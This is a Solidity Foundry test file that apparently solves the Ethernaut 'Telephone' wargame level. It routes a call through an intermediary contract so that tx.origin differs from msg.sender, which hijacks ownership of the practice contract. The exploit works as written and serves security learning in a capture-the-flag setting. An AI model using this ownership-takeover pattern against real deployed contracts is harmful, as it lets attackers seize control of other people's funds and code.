pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Telephone} from "../src/04-telephone.sol";

contract Telephone04Test is Test {
    Telephone tphone;
    CallTelephone ctphone;

    function setUp() public {
        emit log_string("🧪 Setup TelephoneTest...");

        address bob = mkaddr("bob");
        vm.prank(bob);
        tphone = new Telephone();
        ctphone = new CallTelephone();

        emit log_named_address("Owner is: ", tphone.owner());
    }

    function testTelephone() public {
        emit log_string("🧪 Cracking Telephone...");
        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        vm.startPrank(alice);
        ctphone.calltp(address(tphone), alice);
        vm.stopPrank();

        emit log_named_address("Owner has changed to: ", tphone.owner());
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}

contract CallTelephone {
    function calltp(address addrA, address addrB) public {
        iTelephone(addrA).changeOwner(addrB);
    }
}

interface iTelephone {
    function changeOwner(address _owner) external;
}
